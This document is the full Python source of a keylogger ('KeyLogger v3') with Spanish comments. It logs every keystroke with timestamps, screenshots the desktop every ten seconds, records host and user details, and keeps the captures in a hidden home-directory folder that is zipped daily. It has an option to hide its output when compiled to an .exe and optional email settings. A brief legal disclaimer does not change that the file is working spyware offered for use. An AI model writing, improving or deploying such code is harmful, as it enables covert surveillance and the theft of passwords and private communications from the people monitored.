


##  Código completo (`keylogger_v3.py`)


"""
KeyLogger v3 
- Organización por día (carpetas YYYY-MM-DD)
- Empaquetado automático diario a ZIP
- Capturas frecuentes (default 10s)
- Log de teclas legible con timestamps
- Modo local por defecto (email opcional)

ADVERTENCIA LEGAL: Uso exclusivo en laboratorio/pentesting autorizado.
"""

import os
import sys
import time
import zipfile
import platform
import socket
import threading
import shutil
from datetime import datetime, timedelta
from subprocess import call


# =========================================================
# 1. INSTALACIÓN AUTOMÁTICA DE DEPENDENCIAS
# =========================================================
def instalar_dependencias():
    try:
        import pyscreenshot  # noqa
        from pynput import keyboard  # noqa
    except ModuleNotFoundError:
        print("[!] Instalando dependencias...")
        call(f"{sys.executable} -m pip install pyscreenshot pynput", shell=True)


instalar_dependencias()

import pyscreenshot  # noqa
from pynput import keyboard  # noqa
from pynput.keyboard import Listener, Key  # noqa


# =========================================================
# 2. CONFIGURACIÓN
# =========================================================
SCREENSHOT_EVERY    = 10        # segundos entre capturas
MAX_KEYS_PER_FILE   = 5000      # rotación del archivo de teclas
PAUSA_MINUTOS       = 2         # minutos de inactividad → marca de pausa
AUTO_LIMPIAR_DIAS   = True      # borrar carpeta tras comprimir el día
MODO_EXE            = False     # True si corre como .exe (oculta prints)

# Email (opcional, desactivado por defecto)
ENVIAR_EMAIL        = False
EMAIL_ADDRESS       = "tu_correo@dominio.com"
EMAIL_PASSWORD      = "tu_app_password"
SMTP_SERVER         = "smtp.gmail.com"
SMTP_PORT           = 587

# Carpetas base
BASE_DIR = os.path.join(os.path.expanduser("~"), ".klab")
os.makedirs(BASE_DIR, exist_ok=True)


# =========================================================
# 3. UTILIDADES
# =========================================================
def log(msg):
    """Print silencioso si corre como .exe."""
    if not MODO_EXE:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")


def hoy_str():
    return datetime.now().strftime("%Y-%m-%d")


def ts_str():
    return datetime.now().strftime("%Y%m%d_%H%M%S")


def info_equipo():
    try:
        ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        ip = "N/A"
    try:
        user = os.getlogin()
    except Exception:
        user = os.environ.get("USER") or os.environ.get("USERNAME") or "N/A"
    return (
        f"=== INFO EQUIPO ===\n"
        f"Hostname    : {socket.gethostname()}\n"
        f"IP local    : {ip}\n"
        f"Usuario     : {user}\n"
        f"SO          : {platform.system()} {platform.release()}\n"
        f"Arquitectura: {platform.machine()}\n"
        f"Procesador  : {platform.processor()}\n"
        f"Python      : {platform.python_version()}\n"
        f"Fecha       : {datetime.now().isoformat()}\n"
    )


# =========================================================
# 4. GESTOR DE DÍAS
# =========================================================
class GestorDias:
    """Administra carpetas por día y comprime el día anterior."""

    def __init__(self, base_dir):
        self.base_dir = base_dir
        self.dia_actual = hoy_str()
        self.dir_dia = self._preparar_dia(self.dia_actual)
        self.dir_keys = os.path.join(self.dir_dia, "keys")
        self.dir_shots = os.path.join(self.dir_dia, "screenshots")
        os.makedirs(self.dir_keys, exist_ok=True)
        os.makedirs(self.dir_shots, exist_ok=True)

    def _preparar_dia(self, dia):
        d = os.path.join(self.base_dir, dia)
        os.makedirs(d, exist_ok=True)
        return d

    def comprimir_dia(self, dia):
        """Comprime la carpeta del día a YYYY-MM-DD.zip."""
        carpeta = os.path.join(self.base_dir, dia)
        if not os.path.isdir(carpeta):
            return None
        zip_path = os.path.join(self.base_dir, f"{dia}.zip")
        try:
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                for root, _, files in os.walk(carpeta):
                    for f in files:
                        full = os.path.join(root, f)
                        rel = os.path.relpath(full, carpeta)
                        zf.write(full, arcname=rel)
            log(f"Día comprimido: {zip_path}")
            if AUTO_LIMPIAR_DIAS:
                shutil.rmtree(carpeta, ignore_errors=True)
                log(f"Carpeta original borrada: {carpeta}")
            return zip_path
        except Exception as e:
            log(f"Error comprimiendo {dia}: {e}")
            return None

    def comprimir_dias_pendientes(self):
        """Comprime cualquier carpeta YYYY-MM-DD antigua que no esté en ZIP."""
        for item in os.listdir(self.base_dir):
            full = os.path.join(self.base_dir, item)
            if not os.path.isdir(full):
                continue
            # Formato YYYY-MM-DD
            try:
                datetime.strptime(item, "%Y-%m-%d")
            except ValueError:
                continue
            if item == self.dia_actual:
                continue
            zip_path = os.path.join(self.base_dir, f"{item}.zip")
            if not os.path.exists(zip_path):
                self.comprimir_dia(item)
            elif AUTO_LIMPIAR_DIAS:
                shutil.rmtree(full, ignore_errors=True)

    def verificar_cambio_dia(self):
        """Si cambió el día, comprime el anterior y prepara el nuevo."""
        hoy = hoy_str()
        if hoy != self.dia_actual:
            log(f"Cambio de día: {self.dia_actual} → {hoy}")
            self.comprimir_dia(self.dia_actual)
            self.dia_actual = hoy
            self.dir_dia = self._preparar_dia(hoy)
            self.dir_keys = os.path.join(self.dir_dia, "keys")
            self.dir_shots = os.path.join(self.dir_dia, "screenshots")
            os.makedirs(self.dir_keys, exist_ok=True)
            os.makedirs(self.dir_shots, exist_ok=True)
            return True
        return False


# =========================================================
# 5. KEYLOGGER PRINCIPAL
# =========================================================
class KeyLogger:
    def __init__(self):
        self.gestor = GestorDias(BASE_DIR)
        self.lock = threading.Lock()

        # Sesión de teclas actual
        self.session_start = datetime.now()
        self.ultima_tecla = datetime.now()
        self.pausa_marcada = False
        self.teclas_en_archivo = 0
        self.current_keys_file = self._nuevo_keys_file()
        self._escribir_encabezado()

        # Capturas pendientes (solo para referencia)
        self.total_shots = 0
        self.total_keys = 0

    # -----------------------------------------------------
    # Archivos de teclas
    # -----------------------------------------------------
    def _nuevo_keys_file(self):
        nombre = f"keys_{ts_str()}.txt"
        return os.path.join(self.gestor.dir_keys, nombre)

    def _escribir_encabezado(self):
        """Encabezado legible al inicio de cada archivo."""
        try:
            try:
                user = os.getlogin()
            except Exception:
                user = os.environ.get("USER") or os.environ.get("USERNAME") or "N/A"
            header = (
                "=" * 64 + "\n"
                f"SESIÓN INICIADA: {self.session_start.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"Equipo         : {socket.gethostname()}\n"
                f"Usuario        : {user}\n"
                + "=" * 64 + "\n\n"
            )
            with open(self.current_keys_file, "a", encoding="utf-8") as f:
                f.write(header)
        except Exception as e:
            log(f"Error escribiendo encabezado: {e}")

    def _rotar_archivo_si_necesario(self):
        if self.teclas_en_archivo >= MAX_KEYS_PER_FILE:
            self.current_keys_file = self._nuevo_keys_file()
            self.session_start = datetime.now()
            self.teclas_en_archivo = 0
            self._escribir_encabezado()
            log("Archivo de teclas rotado")

    def _escribir(self, texto):
        """Escribe texto al archivo actual con control de bloqueo."""
        with self.lock:
            self._rotar_archivo_si_necesario()
            try:
                with open(self.current_keys_file, "a", encoding="utf-8") as f:
                    f.write(texto)
                self.teclas_en_archivo += 1
                self.total_keys += 1
            except Exception as e:
                log(f"Error escribiendo tecla: {e}")

    # -----------------------------------------------------
    # Formato de teclas
    # -----------------------------------------------------
    def _formatear_tecla(self, key):
        # Flechas y navegación
        mapa = {
            Key.space: " ",
            Key.enter: "<ENTER>\n",
            Key.tab: "<TAB>",
            Key.backspace: "<BACKSPACE>",
            Key.delete: "<DELETE>",
            Key.esc: "<ESC>",
            Key.up: "<UP>",
            Key.down: "<DOWN>",
            Key.left: "<LEFT>",
            Key.right: "<RIGHT>",
            Key.home: "<HOME>",
            Key.end: "<END>",
            Key.page_up: "<PGUP>",
            Key.page_down: "<PGDN>",
            Key.insert: "<INSERT>",
            Key.print_screen: "<PRTSC>",
            Key.scroll_lock: "<SCRLK>",
            Key.pause: "<PAUSE>",
            Key.num_lock: "<NUMLK>",
            Key.caps_lock: "<CAPSLOCK>",
            Key.ctrl: "<CTRL>",
            Key.ctrl_l: "<CTRL>",
            Key.ctrl_r: "<CTRL>",
            Key.alt: "<ALT>",
            Key.alt_l: "<ALT>",
            Key.alt_r: "<ALT>",
            Key.alt_gr: "<ALT>",
            Key.cmd: "<WIN>",
        }
        if key in mapa:
            return mapa[key]

        # F1-F12
        for i in range(1, 13):
            if key == getattr(Key, f"f{i}"):
                return f"<F{i}>"

        # Shift (se registra al soltar)
        if key in (Key.shift, Key.shift_l, Key.shift_r):
            return None

        # Carácter normal
        try:
            return key.char
        except AttributeError:
            return f"<{str(key).replace('Key.', '').upper()}>"

    # -----------------------------------------------------
    # Callbacks de teclado
    # -----------------------------------------------------
    def on_press(self, key):
        try:
            ahora = datetime.now()
            # Pausa por inactividad
            delta = (ahora - self.ultima_tecla).total_seconds()
            if delta >= PAUSA_MINUTOS * 60 and not self.pausa_marcada:
                self._escribir(
                    f"\n\n--- PAUSA DE {int(delta // 60)} MIN ---\n\n"
                )
                self.pausa_marcada = True

            texto = self._formatear_tecla(key)
            if texto is not None:
                # Timestamp solo si hubo pausa o es la primera tecla del bloque
                if self.pausa_marcada or self.teclas_en_archivo == 0:
                    prefijo = f"[{ahora.strftime('%H:%M:%S')}] "
                    self._escribir(prefijo + texto)
                    self.pausa_marcada = False
                else:
                    self._escribir(texto)

            self.ultima_tecla = ahora
        except Exception:
            pass

    def on_release(self, key):
        # Registra el soltar Shift como marcador legible
        if key in (Key.shift, Key.shift_l, Key.shift_r):
            self._escribir("<SHIFT>")

    # -----------------------------------------------------
    # Hilo de capturas
    # -----------------------------------------------------
    def screenshot_worker(self):
        while True:
            try:
                self.gestor.verificar_cambio_dia()
                fname = os.path.join(
                    self.gestor.dir_shots, f"shot_{ts_str()}.png"
                )
                img = pyscreenshot.grab()
                img.save(fname)
                self.total_shots += 1
                if self.total_shots % 30 == 0:
                    log(f"Screenshots: {self.total_shots} | Teclas: {self.total_keys}")
            except Exception as e:
                log(f"Error screenshot: {e}")
            time.sleep(SCREENSHOT_EVERY)

    # -----------------------------------------------------
    # Hilo verificador de cambio de día (cada 60s)
    # -----------------------------------------------------
    def dia_worker(self):
        # Comprimir días pendientes al inicio
        self.gestor.comprimir_dias_pendientes()
        while True:
            time.sleep(60)
            try:
                self.gestor.verificar_cambio_dia()
            except Exception as e:
                log(f"Error verificando día: {e}")

    # -----------------------------------------------------
    # Arranque
    # -----------------------------------------------------
    def start(self):
        log("=" * 55)
        log("KeyLogger v3 iniciado")
        log(f"Directorio : {BASE_DIR}")
        log(f"Día actual : {self.gestor.dia_actual}")
        log(f"Shot cada  : {SCREENSHOT_EVERY}s")
        log(f"Email      : {'ON' if ENVIAR_EMAIL else 'OFF (modo local)'}")
        log("=" * 55)

        # Guardar info del equipo
        with open(os.path.join(BASE_DIR, "info.txt"), "w", encoding="utf-8") as f:
            f.write(info_equipo())

        # Hilos
        threading.Thread(target=self.screenshot_worker, daemon=True).start()
        threading.Thread(target=self.dia_worker, daemon=True).start()

        # Listener bloqueante
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()


# =========================================================
# 6. MAIN
# =========================================================
if __name__ == "__main__":
    try:
        kl = KeyLogger()
        kl.start()
    except KeyboardInterrupt:
        log("Detenido por el usuario.")
        # Comprimir el día actual al salir
        try:
            kl.gestor.comprimir_dia(kl.gestor.dia_actual)
        except Exception:
            pass
    except Exception as e:
        log(f"Error fatal: {e}")